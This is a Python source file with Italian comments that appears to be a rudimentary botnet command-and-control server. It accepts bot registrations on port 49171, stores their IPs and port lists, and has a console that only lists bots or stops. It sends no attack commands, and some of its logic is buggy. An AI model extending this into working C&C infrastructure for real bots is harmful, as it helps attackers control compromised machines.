import concurrent.futures
import socket
from concurrent.futures import ThreadPoolExecutor
from time import sleep



class CC:

    #lista dei bot attivi con le relative porte
    activeBotSf = True
    activeBot = {}
    #stato di ogni bot
    botStatusSf = True
    botStatus = {}

    #costruttore
    def __init__(self):
        return

    #aggiunge un bot alle liste
    def addBot(self, ip, portList):
        while(not self.activeBotSf):
            continue
        self.activeBotSf = False
        self.activeBot[ip] = portList
        self.activeBotSf = True

    #imposta lo stato di attività del bot
    def setBotStatus(self, ip, status):
        while (not self.botStatusSf):
            continue
        self.botStatusSf = False
        self.botStatus[ip] = "waiting"
        self.botStatusSf = True

    def listen(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', 49171))
            print("Server is listening")
            while(True):
                s.listen()
                conn, addr = s.accept()
                data = conn.recv(1024).decode()
                data = data.split(" ")
                self.addBot(data[0], data[1].strip('][').split(','))
                self.setBotStatus(data[0], "waiting")
                data = "bot registrated succesfully"
                conn.send(data.encode())
                conn.close()
        except:
            print("Listening errors")
            return

    def command(self):
        sleep(1)
        while(True):
            comando = input("C&C@command: ")
            if comando == "stop":
                break
            if comando == "ls":
                print(self.activeBot)
        return

#avvia il C&C
def startCC():
    print("Starting C&C...")
    cc = CC()
    with ThreadPoolExecutor(max_workers=2) as exec:
        r1 = exec.submit(cc.listen)
        r2 = exec.submit(cc.command)
        done, not_done = concurrent.futures.wait([r1,r2], return_when=concurrent.futures.FIRST_COMPLETED)
        exec.shutdown(wait=False)
        return

if __name__=="__main__":
    startCC()